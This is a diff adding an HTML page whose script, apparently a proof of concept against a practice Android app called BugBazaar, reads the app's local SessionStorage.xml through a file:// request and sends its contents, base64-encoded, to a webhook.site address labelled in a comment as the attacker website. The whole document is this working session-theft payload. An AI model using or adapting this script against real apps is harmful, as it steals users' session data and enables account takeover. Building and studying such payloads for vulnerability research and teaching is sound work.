@@ -1,0 +1,18 @@
+<script>
+    var url='file:///data/data/com.BugBazaar/shared_prefs/SessionStorage.xml'; 
+    function load(url){
+    
+         var xhr=new XMLHttpRequest();
+         
+		 xhr.onreadystatechange=function(){
+              if(xhr.readyState == 4){
+				//Send base64 data of above file to attacker website
+              fetch('https://webhook.site/0c92452a-a056-4739-9bba-e79e2e3744c5/?data=d'+ btoa(xhr.responseText));
+             }
+			 }
+         xhr.open('GET',url,true);
+         xhr.send('');
+		 }
+		 load(url)
+		 
+</script>
